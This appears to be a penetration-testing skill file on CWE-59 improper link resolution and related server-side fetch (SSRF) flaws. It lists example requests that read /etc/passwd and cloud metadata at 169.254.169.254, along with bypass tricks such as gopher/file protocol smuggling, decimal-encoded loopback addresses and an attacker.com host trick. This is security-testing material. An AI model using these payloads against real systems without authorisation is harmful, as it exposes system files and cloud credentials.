
name: cwe-59-improper-link-resolution
description: Use when a file param follows a link/alias to a target.
version: 1.0.0
license: MIT
platforms: [linux, windows]
tags: [cwe, cwe-59, access-control, pentest, owasp, a01]
category: pentesting-skills
related_skills:
  - owasp-a01-broken-access-control
---

# CWE-59 - Improper Link Resolution before File Access

CWE-59: Improper Link Resolution before File Access - an application resolves symlinks/hardlinks/references and then uses the target, or follows a URL redirect server-side to fetch a previously-privileged path.

## Parent Skill

This is a sub-skill of `owasp-a01-broken-access-control` (OWASP A01 Broken Access Control, Top 10 2025).
Load the parent for overall A01 scope, validation criteria (negative control), and
the reporting template. This skill covers the CWE-59 detail: what to look for,
how to trigger it, and what a confirmed finding looks like.

## When to Use

- Use when a URL/file parameter follows links, redirects, or aliases and leaks a resource resolved on the server.

## Detection & Test

1. Probe URL/file=/url= parameters that perform server-side fetches (image hotlinking, file preview, 'fetch resource').
2. Supply links that resolve to file:///etc/passwd, ftp://..., gopher://127.0.0.1:port/, or redirect to an admin path.
3. Test the 'resolved' value the server returns; the resolved URL/path may be the real server file.
4. Chain with SSRF-style targets; confirm the server dereferenced and returned a privileged resource.

## Example Requests

```http
GET /fetch?url=file:///etc/passwd
```
```http
GET /image?url=/var/www/secret.png
```
```http
GET /preview?url=ftp://169.254.169.254/latest/meta-data/
```

## Bypass Tricks

- Protocol smuggling: `file://`, `gopher://`, `dict://`, `ftp://` where only `http` is expected.
- Redirect-to-file: point a URL to an admin page that 302-redirects to a `file://` target.
- Use a local/loopback host: `http://127.0.0.1/admin`.
- IPv4 decimal / octal: `http://2130706433/` for 127.0.0.1.
- Host header tricks: `http://admin\@attacker.com/`.
- Follow a 302 chain the server resolves on your behalf to a privileged path.
- Supply a `file:///` URI where the app concatenates the parameter into a path.


## Impact

- Server-side file/URL dereferencing to read internal resources.

## See Also

- `owasp-a01-broken-access-control` - parent skill (A01 scope, Test Procedure, Validation, reporting).
- `owasp-top10-2025-testing` - top-level OWASP Top 10 2025 reference (full 249-CWE table, priority order).